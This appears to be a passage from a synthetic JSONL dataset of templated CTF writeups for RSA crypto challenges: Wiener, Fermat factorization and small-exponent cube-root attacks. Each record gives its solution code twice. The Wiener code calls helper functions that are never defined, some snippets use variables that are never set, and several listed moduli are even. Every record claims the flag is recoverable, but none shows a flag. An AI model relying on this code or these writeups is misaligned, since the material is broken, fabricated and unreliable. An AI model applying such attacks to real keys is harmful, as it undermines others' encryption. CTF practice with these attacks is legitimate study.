of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/14", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825572", "synthetic": true}
{"id": "synthetic_rsa_015", "team": "synthetic_team_5", "event": "CTF_2024_Event_1", "challenge_name": "RSA Fermat Factorization #16", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/15", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825588", "synthetic": true}
{"id": "synthetic_rsa_016", "team": "synthetic_team_7", "event": "CTF_2024_Event_9", "challenge_name": "RSA Small Exponent Attack #17", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 49584411649913823537861136466016884390252765495526328160835411350073819577110415436818615031778155660412261513738787408123237555964238004751792986086729621548183850875694511349848987291757452413096878431375806336191319679508238837785785788137926956913498899483390233793163641476172489495323178477212352\ne = 3\nc = 48055628536006646558073604569068743686314043632233684946799153451822145664669324551540748195561647346744563238521547169336382113522043905634291467781824449726776097066409853390789318206868527608911106226125262179027854111770640951074679479334911430836197223359051554453963913314891276507245966674196145\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 49584411649913823537861136466016884390252765495526328160835411350073819577110415436818615031778155660412261513738787408123237555964238004751792986086729621548183850875694511349848987291757452413096878431375806336191319679508238837785785788137926956913498899483390233793163641476172489495323178477212352\ne = 3\nc = 48055628536006646558073604569068743686314043632233684946799153451822145664669324551540748195561647346744563238521547169336382113522043905634291467781824449726776097066409853390789318206868527608911106226125262179027854111770640951074679479334911430836197223359051554453963913314891276507245966674196145\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/16", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825615", "synthetic": true}
{"id": "synthetic_rsa_017", "team": "synthetic_team_1", "event": "CTF_2024_Event_7", "challenge_name": "RSA Fermat Factorization #18", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/17", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825628", "synthetic": true}
{"id": "synthetic_rsa_018", "team": "synthetic_team_5", "event": "CTF_2024_Event_1", "challenge_name": "RSA Small Exponent Attack #19", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 16530766481307239586607437810986926774756669524045604634523692567206401103375155990063230115591108536286926252505677971413997137192946305944883817661937820459546801107967357119754957152785413961998365494987635243973884242240602805480814697614411316543351299056275504945180082429621388045996689114460608\ne = 3\nc = 1162558787133740559146810157515785603595271198195690071205349875742144776702156623796547582649876953425423079135602088100689807770668915807381290422189191317715359660654005841291376879846952029004738791900581302460414354970290029453229973695250482697604527467307176851400822161025903979542159380436030\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 16530766481307239586607437810986926774756669524045604634523692567206401103375155990063230115591108536286926252505677971413997137192946305944883817661937820459546801107967357119754957152785413961998365494987635243973884242240602805480814697614411316543351299056275504945180082429621388045996689114460608\ne = 3\nc = 1162558787133740559146810157515785603595271198195690071205349875742144776702156623796547582649876953425423079135602088100689807770668915807381290422189191317715359660654005841291376879846952029004738791900581302460414354970290029453229973695250482697604527467307176851400822161025903979542159380436030\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/18", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825651", "synthetic": true}
{"id": "synthetic_rsa_019", "team": "synthetic_team_2", "event": "CTF_2024_Event_18", "challenge_name": "RSA Wiener Attack #20", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/19", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825666", "synthetic": true}
{"id": "synthetic_rsa_020", "team": "synthetic_team_7", "event": "CTF_2024_Event_10", "challenge_name": "RSA Small Exponent Attack #21", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 10157419414690405621423015027267391749736566916497503553349441667711172518862677206619048856883913046738809077958626554964061343413410679211094136703502779364221834937726859030986729028147163557467715482615735215328489529078281249637917019129919444526515800765769584300770223711203140073168630749870305\ne = 3\nc = 6943642975083013334052606781549240217629990181326482002247765947939876165114333803613300758476746008086081215739859544723677258662480236971681246371082349909585722267148886514690377596886930344085239885691971536878148362563444482543750955527602800055627712451919350375535697951431811126627118821051730\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 10157419414690405621423015027267391749736566916497503553349441667711172518862677206619048856883913046738809077958626554964061343413410679211094136703502779364221834937726859030986729028147163557467715482615735215328489529078281249637917019129919444526515800765769584300770223711203140073168630749870305\ne = 3\nc = 6943642975083013334052606781549240217629990181326482002247765947939876165114333803613300758476746008086081215739859544723677258662480236971681246371082349909585722267148886514690377596886930344085239885691971536878148362563444482543750955527602800055627712451919350375535697951431811126627118821051730\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/20", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825695", "synthetic": true}
{"id": "synthetic_rsa_021", "team": "synthetic_team_2", "event": "CTF_2024_Event_12", "challenge_name": "RSA Wiener Attack #22", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/21", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825710", "synthetic": true}
{"id": "synthetic_rsa_022", "team": "synthetic_team_9", "event": "CTF_2024_Event_8", "challenge_name": "RSA Small Exponent Attack #23", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 45406503332449051649771218020058062921334509466837714638347546296963484901677582629201272076651461930338534498313733239277210229949567036267212552243582345975479367287420182746851142482851193158913606283191540128213482699740906256969320835347929922727463366037756959912016667580652265629239817266887490\ne = 3\nc = 34339520066519704960696670069896614115759775940522355477222215387163598884167952424775484849679647809014773611403062300027443244751879788243260359590923520201492627369153106122402023733478556869520008441335671346658247657221966431020578467420935569814214533447870275621164782501586631920528621056364185\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 45406503332449051649771218020058062921334509466837714638347546296963484901677582629201272076651461930338534498313733239277210229949567036267212552243582345975479367287420182746851142482851193158913606283191540128213482699740906256969320835347929922727463366037756959912016667580652265629239817266887490\ne = 3\nc = 34339520066519704960696670069896614115759775940522355477222215387163598884167952424775484849679647809014773611403062300027443244751879788243260359590923520201492627369153106122402023733478556869520008441335671346658247657221966431020578467420935569814214533447870275621164782501586631920528621056364185\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/22", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825734", "synthetic": true}
{"id": "synthetic_rsa_023", "team": "synthetic_team_5", "event": "CTF_2024_Event_20", "challenge_name": "RSA Small Exponent Attack #24", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 63793608364679756011577944177394988127611359802373496687670313733333691223153462826057692876698761850755780669131499443345949694669325903728706519757390662872647666125726681678069579826494541268250253189973078854049458994078513910088983813698077864557251536171446760807830581184405136688666452313574470\ne = 3\nc = 17429994139410092077296328704738919471706125995512928431455841425305794921484351422320669244727020417531304480619032716745538682156969047413472267835571303968819383471437247005950167392774602879768475552364538709088343636330877544974865190647248770893166045592563384626586257805046866180289397099038106\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 63793608364679756011577944177394988127611359802373496687670313733333691223153462826057692876698761850755780669131499443345949694669325903728706519757390662872647666125726681678069579826494541268250253189973078854049458994078513910088983813698077864557251536171446760807830581184405136688666452313574470\ne = 3\nc = 17429994139410092077296328704738919471706125995512928431455841425305794921484351422320669244727020417531304480619032716745538682156969047413472267835571303968819383471437247005950167392774602879768475552364538709088343636330877544974865190647248770893166045592563384626586257805046866180289397099038106\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/23", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825757", "synthetic": true}
{"id": "synthetic_rsa_024", "team": "synthetic_team_10", "event": "CTF_2024_Event_12", "challenge_name": "RSA Small Exponent Attack #25", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 20741999577407828179364251759906530050361274097437917284265574866975435778558618748745570217516982447882443403965081539354563156248167231284585031584709506483128457954792828441603749851708432305530346620512743559205137998920584247043091929578837040819138523462533374519754953349037152947912694809809072\ne = 3\nc = 6439823823633021395064393170641657443196171410533215134499556908558119457437973107324975842362472594870793150190753421197249492972305284440581376399591777768193381807228304306160354325861066068932406043177635614870291065031580214117712883498963490234652608269909415100647816556582381873778176687366008\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 20741999577407828179364251759906530050361274097437917284265574866975435778558618748745570217516982447882443403965081539354563156248167231284585031584709506483128457954792828441603749851708432305530346620512743559205137998920584247043091929578837040819138523462533374519754953349037152947912694809809072\ne = 3\nc = 6439823823633021395064393170641657443196171410533215134499556908558119457437973107324975842362472594870793150190753421197249492972305284440581376399591777768193381807228304306160354325861066068932406043177635614870291065031580214117712883498963490234652608269909415100647816556582381873778176687366008\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/24", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825778", "synthetic": true}
{"id": "synthetic_rsa_025", "team": "synthetic_team_1", "event": "CTF_2024_Event_20", "challenge_name": "RSA Small Exponent Attack #26", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 71434685698887952574357225414912906392659018910325903131193807526027549898324156587639523923197274641360099622441794433354239303191087856529232137390083138991364417057914497639448897557245985220283374956349279118753023031966392989276570428292824193170058510226653173793287504882945771178706737460351728\ne = 3\nc = 49090667956145198506878092441136862638538533815389337406477567807348510920369788105342375839463628007674496821895343341119049578417686798090088305246657500402302677433267872630701020027148189747152744554816268575054364243931714254917716194548935203060489294472488305176141963787067768858147993724713316\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 71434685698887952574357225414912906392659018910325903131193807526027549898324156587639523923197274641360099622441794433354239303191087856529232137390083138991364417057914497639448897557245985220283374956349279118753023031966392989276570428292824193170058510226653173793287504882945771178706737460351728\ne = 3\nc = 49090667956145198506878092441136862638538533815389337406477567807348510920369788105342375839463628007674496821895343341119049578417686798090088305246657500402302677433267872630701020027148189747152744554816268575054364243931714254917716194548935203060489294472488305176141963787067768858147993724713316\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/25", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825799", "synthetic": true}
{"id": "synthetic_rsa_026", "team": "synthetic_team_8", "event": "CTF_2024_Event_16", "challenge_name": "RSA Small Exponent Attack #27", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 38029448105727378327761265200015279922823991964680714286019144629747604477202836476568431858604968723228412435827840774906600987732610806278617643181471135253699248256353184691017627626041477994675090368204394827342349113453964756214054754524212439528289032074740818574883789641376405660508379100431634\ne = 3\nc = 12871277411800954902596274740649414965742988862661471451241812784553894831683458519087818256338359932636534988078531062223319785105776343401744355239809808568713059031274107876119086999687869216424305277644239735852284390223220832374528999779117108922384732598390074623077199660386487192243644175044814\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 38029448105727378327761265200015279922823991964680714286019144629747604477202836476568431858604968723228412435827840774906600987732610806278617643181471135253699248256353184691017627626041477994675090368204394827342349113453964756214054754524212439528289032074740818574883789641376405660508379100431634\ne = 3\nc = 12871277411800954902596274740649414965742988862661471451241812784553894831683458519087818256338359932636534988078531062223319785105776343401744355239809808568713059031274107876119086999687869216424305277644239735852284390223220832374528999779117108922384732598390074623077199660386487192243644175044814\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/26", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825821", "synthetic": true}
{"id": "synthetic_rsa_027", "team": "synthetic_team_1", "event": "CTF_2024_Event_2", "challenge_name": "RSA Wiener Attack #28", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/27", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825836", "synthetic": true}
{"id": "synthetic_rsa_028", "team": "synthetic_team_2", "event": "CTF_2024_Event_4", "challenge_name": "RSA Small Exponent Attack #29", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 70400767233252712213317703814147814678886605173494466156991942820353820562418384624917609158019659028768845428410032907995463985715001256396962933038507929048946361512107987414669678531583183013349479819293453529316954035362139406637058130686717900056105556022115706218297138756157999831555750955186650\ne = 3\nc = 53995910242714642680389778085939637960589059830724467737721204970603310848291201852155468764438031478747087793943975225097116735845227794283474913753815358057049122350251271369515842415909353717321575541767935519750518802949691091738135828985071596481900463199059617069477823989853416020835212772356496\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = 